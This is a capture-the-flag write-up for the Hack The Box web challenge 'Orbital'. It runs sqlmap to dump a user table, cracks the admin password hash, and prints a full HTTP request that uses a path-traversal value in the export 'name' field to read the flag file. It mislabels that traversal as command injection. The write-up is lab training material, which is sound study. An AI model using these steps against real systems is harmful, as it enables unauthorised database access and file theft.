# Orbital (WEB)

In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?

## Writeup

1. On checking the source files, there is same sql code from passman challenge, therefore I thought it might have sql injection. After trying manually and having no luck, I moved to sqlmap

I saved the request from burpsuite and pass the req param to sqlmap

```
sqlmap -r req --dump
```

Then, I have cracked the password using dictionary-based attack.
```
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+
```

2. Login with this credentials, we cannot see the flag in the webpage.

I have exported communication and capture the request in burpsuite and it is having command injection.

Moreover, from `Dockerfile` we can see that flag is here in `/signal_sleuth_firmware`

```
# copy flag
COPY flag.txt /signal_sleuth_firmware
```

I have changed the name parameter in export, therefore the request will look like this:

```
POST /api/export HTTP/1.1
Host: 138.68.158.112:31552
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.158.112:31552/home
Content-Type: application/json;charset=UTF-8
Content-Length: 45
Origin: http://138.68.158.112:31552
DNT: 1
Connection: close
Cookie: session=my-session-cookie

{"name":"../../../../signal_sleuth_firmware"}
```

In response, boom, we get our flag.

## Flag:

`HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`
